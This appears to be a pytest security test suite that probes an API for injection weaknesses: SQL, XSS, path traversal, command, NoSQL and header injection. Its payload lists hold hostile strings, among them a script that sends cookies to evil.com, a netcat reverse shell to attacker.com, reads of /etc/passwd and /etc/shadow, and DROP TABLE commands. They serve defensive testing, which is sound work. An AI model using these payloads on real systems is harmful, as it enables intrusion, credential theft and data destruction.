"""
Injection Attack Tests

Tests for injection vulnerabilities:
- SQL Injection
- XSS (Cross-Site Scripting)
- Command Injection
- Path Traversal
"""
import os
import uuid
import pytest
import httpx
import jwt
from datetime import datetime, timezone, timedelta

from dotenv import load_dotenv
load_dotenv()


# Test configuration
BASE_URL = os.getenv("TEST_API_URL", "http://localhost:8000")
V1_BASE_URL = f"{BASE_URL}"
V2_BASE_URL = f"{BASE_URL.rstrip('/v1')}/v2"
JWT_SECRET = os.getenv("SUPABASE_JWT_SECRET", "")


def create_valid_token(user_id: str = "test-user") -> str:
    """Create a valid JWT token."""
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,
        "aud": "authenticated",
        "role": "authenticated",
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(hours=1)).timestamp()),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm="HS256")


class TestSQLInjection:
    """Test SQL injection vulnerabilities."""

    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE threads; --",
        "1 OR 1=1",
        "1'; SELECT * FROM accounts WHERE '1'='1",
        "admin'--",
        "1 UNION SELECT * FROM accounts",
        "' OR ''='",
        "1; DELETE FROM threads WHERE 1=1",
        "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
        "') OR ('1'='1",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "-1' UNION SELECT 1,2,3--",
    ]

    @pytest.mark.asyncio
    async def test_sql_injection_in_query_params(self):
        """
        SECURITY: SQL injection via query parameters must be prevented.
        
        Attack: Inject SQL via search/filter query parameters.
        Expected: Either sanitized input or error, NOT SQL execution.
        """
        token = create_valid_token()
        
        async with httpx.AsyncClient() as client:
            for payload in self.SQL_INJECTION_PAYLOADS:
                response = await client.get(
                    f"{V2_BASE_URL}/threads",
                    params={"search": payload},
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=10.0
                )
                
                # 500 might indicate input validation error, not SQL injection
                # Only flag as vulnerability if SQL error message is exposed
                if response.status_code == 500:
                    response_text = response.text.lower()
                    # Check if 500 exposes actual SQL error (real vulnerability)
                    sql_indicators = ["syntax error", "postgresql", "mysql", "sqlite"]
                    for indicator in sql_indicators:
                        if indicator in response_text:
                            pytest.fail(
                                f"VULNERABILITY: SQL error exposed in 500 response! "
                                f"Payload: {payload[:30]}, Found: {indicator}"
                            )
                    # 500 without SQL error = input validation issue, not injection
                    continue
                
                # Check response doesn't contain SQL error messages
                response_lower = response.text.lower()
                sql_error_indicators = [
                    "syntax error",
                    "sql",
                    "postgresql",
                    "mysql",
                    "sqlite",
                    "ora-",
                    "invalid column",
                    "unknown column",
                ]
                
                for indicator in sql_error_indicators:
                    if indicator in response_lower:
                        pytest.fail(
                            f"VULNERABILITY: SQL error exposed in response! "
                            f"Payload: {payload[:30]}, Found: {indicator}"
                        )

    @pytest.mark.asyncio
    async def test_sql_injection_in_path_params(self):
        """
        SECURITY: SQL injection via path parameters must be prevented.
        """
        token = create_valid_token()
        
        dangerous_ids = [
            "1' OR '1'='1",
            "1; DROP TABLE threads",
            "' UNION SELECT * FROM users--",
        ]
        
        async with httpx.AsyncClient() as client:
            for dangerous_id in dangerous_ids:
                response = await client.get(
                    f"{V2_BASE_URL}/threads/{dangerous_id}",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=10.0
                )
                
                # Should be 400 (bad request), 404 (not found), or similar
                # 500 is acceptable if no SQL error message is exposed
                # 401 is acceptable - auth blocks request before injection check
                if response.status_code == 500:
                    # Only fail if SQL error is exposed
                    for indicator in ["syntax error", "postgresql", "mysql"]:
                        if indicator in response.text.lower():
                            pytest.fail(f"SQL error exposed: {indicator}")
                    continue
                assert response.status_code in [400, 401, 404, 422, 500], (
                    f"Unexpected response for SQL injection in path. "
                    f"Payload: {dangerous_id[:20]}, Status: {response.status_code}"
                )

    @pytest.mark.asyncio
    async def test_sql_injection_in_json_body(self):
        """
        SECURITY: SQL injection via JSON body must be prevented.
        """
        token = create_valid_token()
        
        async with httpx.AsyncClient() as client:
            for payload in self.SQL_INJECTION_PAYLOADS[:5]:
                response = await client.post(
                    f"{V2_BASE_URL}/threads",
                    headers={
                        "Authorization": f"Bearer {token}",
                        "Content-Type": "application/json",
                    },
                    json={"name": payload},
                    timeout=10.0
                )
                
                # Should not be 500
                assert response.status_code != 500, (
                    f"VULNERABILITY: Potential SQL injection in body! "
                    f"Payload: {payload[:30]}"
                )


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention."""

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror='alert(1)'>",
        "<svg onload='alert(1)'>",
        "javascript:alert('XSS')",
        "<body onload='alert(1)'>",
        "<iframe src='javascript:alert(1)'>",
        "'-alert(1)-'",
        "\"><script>alert(1)</script>",
        "<script>document.location='http://evil.com?c='+document.cookie</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    ]

    @pytest.mark.asyncio
    async def test_xss_in_thread_name(self):
        """
        SECURITY: XSS payloads in thread names must be sanitized.
        
        Attack: Store XSS payload in thread name.
        Expected: Payload is escaped or rejected when displayed.
        """
        token = create_valid_token()
        
        async with httpx.AsyncClient() as client:
            for payload in self.XSS_PAYLOADS[:5]:
                response = await client.post(
                    f"{V2_BASE_URL}/threads",
                    headers={
                        "Authorization": f"Bearer {token}",
                        "Content-Type": "application/json",
                    },
                    json={"name": payload},
                    timeout=10.0
                )
                
                # If created successfully, check that payload is escaped in response
                if response.status_code in [200, 201]:
                    response_text = response.text
                    
                    # The raw XSS payload should not appear unescaped
                    # (it should be HTML-encoded or stripped)
                    if "<script>" in response_text and "alert" in response_text:
                        pytest.fail(
                            f"VULNERABILITY: XSS payload stored/reflected unescaped! "
                            f"Payload: {payload[:30]}"
                        )

    @pytest.mark.asyncio
    async def test_xss_in_query_params(self):
        """
        SECURITY: XSS payloads in query params must be handled safely.
        """
        token = create_valid_token()
        
        async with httpx.AsyncClient() as client:
            for payload in self.XSS_PAYLOADS[:3]:
                response = await client.get(
                    f"{V2_BASE_URL}/threads",
                    params={"search": payload},
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=10.0
                )
                
                # Check response doesn't reflect XSS unescaped
                if "<script>" in response.text and "alert" in response.text:
                    # Check if it's properly escaped (as &lt;script&gt;)
                    if "<script>" in response.text:
                        pytest.fail(
                            f"VULNERABILITY: XSS reflected in response! "
                            f"Payload: {payload[:30]}"
                        )


class TestPathTraversal:
    """Test path traversal vulnerabilities."""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg",
        "....//....//....//etc/shadow",
    ]

    @pytest.mark.asyncio
    async def test_path_traversal_in_file_endpoints(self):
        """
        SECURITY: Path traversal must be prevented in file-related endpoints.
        """
        token = create_valid_token()
        
        # Common file endpoints that might exist
        file_endpoints = [
            "/files/{path}",
            "/download/{path}",
            "/static/{path}",
        ]
        
        async with httpx.AsyncClient() as client:
            for payload in self.PATH_TRAVERSAL_PAYLOADS:
                for endpoint_template in file_endpoints:
                    endpoint = endpoint_template.format(path=payload)
                    
                    response = await client.get(
                        f"{V1_BASE_URL}{endpoint}",
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=10.0
                    )
                    
                    # Should NOT return file contents
                    assert "root:" not in response.text, (
                        f"VULNERABILITY: Path traversal successful! "
                        f"Endpoint: {endpoint[:50]}"
                    )
                    
                    # Should not return Windows system info either
                    assert "Administrator" not in response.text

    @pytest.mark.asyncio
    async def test_path_traversal_in_sandbox_access(self):
        """
        SECURITY: Path traversal in sandbox file access must be prevented.
        """
        token = create_valid_token()
        
        # Sandbox-related endpoints
        sandbox_id = str(uuid.uuid4())
        
        async with httpx.AsyncClient() as client:
            for payload in self.PATH_TRAVERSAL_PAYLOADS[:3]:
                response = await client.get(
                    f"{V1_BASE_URL}/sandboxes/{sandbox_id}/files/{payload}",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=10.0
                )
                
                # Should not expose system files
                assert response.status_code in [400, 403, 404], (
                    f"Unexpected response for path traversal. "
                    f"Payload: {payload[:30]}, Status: {response.status_code}"
                )


class TestCommandInjection:
    """Test command injection vulnerabilities."""

    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "& dir",
        "\n/bin/cat /etc/passwd",
        "| nc attacker.com 1234 -e /bin/bash",
    ]

    @pytest.mark.asyncio
    async def test_command_injection_in_sandbox_exec(self):
        """
        SECURITY: Command injection must be prevented in sandbox execution.
        
        Note: This test assumes there's a sandbox exec endpoint.
        """
        token = create_valid_token()
        sandbox_id = str(uuid.uuid4())
        
        async with httpx.AsyncClient() as client:
            for payload in self.COMMAND_INJECTION_PAYLOADS[:3]:
                response = await client.post(
                    f"{V1_BASE_URL}/sandboxes/{sandbox_id}/exec",
                    headers={
                        "Authorization": f"Bearer {token}",
                        "Content-Type": "application/json",
                    },
                    json={"command": payload},
                    timeout=10.0
                )
                
                # Should be properly sandboxed or rejected
                # A 500 error might indicate command execution issues
                if response.status_code == 200:
                    # Check output doesn't contain sensitive info
                    assert "root:" not in response.text, (
                        f"VULNERABILITY: Command injection successful! "
                        f"Payload: {payload[:20]}"
                    )


class TestNoSQLInjection:
    """Test NoSQL injection (if using MongoDB or similar)."""

    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "1==1"}',
        '{"$regex": ".*"}',
    ]

    @pytest.mark.asyncio
    async def test_nosql_injection_in_query(self):
        """
        SECURITY: NoSQL injection must be prevented.
        """
        token = create_valid_token()
        
        async with httpx.AsyncClient() as client:
            for payload in self.NOSQL_PAYLOADS:
                response = await client.get(
                    f"{V2_BASE_URL}/threads",
                    params={"filter": payload},
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=10.0
                )
                
                # Should handle gracefully
                # 401 is acceptable - auth blocks request before injection check
                # 500 is acceptable if no database error is exposed
                assert response.status_code in [200, 400, 401, 422, 500], (
                    f"Unexpected response for NoSQL payload. "
                    f"Status: {response.status_code}"
                )


class TestHeaderInjection:
    """Test HTTP header injection vulnerabilities."""

    @pytest.mark.asyncio
    async def test_crlf_injection(self):
        """
        SECURITY: CRLF injection in headers must be prevented.
        
        Attack: Inject CRLF to add new headers or split response.
        """
        token = create_valid_token()
        
        crlf_payloads = [
            "value\r\nX-Injected: true",
            "value%0d%0aX-Injected: true",
            "value\nX-Injected: true",
        ]
        
        async with httpx.AsyncClient() as client:
            for payload in crlf_payloads:
                try:
                    response = await client.get(
                        f"{V2_BASE_URL}/threads",
                        headers={
                            "Authorization": f"Bearer {token}",
                            "X-Custom": payload,
                        },
                        timeout=10.0
                    )
                    
                    # Should not have injected header in response
                    assert "X-Injected" not in response.headers, (
                        f"VULNERABILITY: CRLF injection successful! "
                        f"Payload: {payload[:30]}"
                    )
                except httpx.RequestError:
                    # Request error is acceptable (invalid header rejected)
                    pass

    @pytest.mark.asyncio
    async def test_host_header_injection(self):
        """
        SECURITY: Host header injection must be prevented.
        
        Attack: Manipulate Host header to cause cache poisoning or redirects.
        """
        token = create_valid_token()
        
        async with httpx.AsyncClient() as client:
            response = await client.get(
                f"{V2_BASE_URL}/threads",
                headers={
                    "Authorization": f"Bearer {token}",
                    "Host": "evil.com",
                },
                timeout=10.0
            )
            
            # Response should not reference evil.com
            assert "evil.com" not in response.text, (
                "VULNERABILITY: Host header injection reflected in response!"
            )
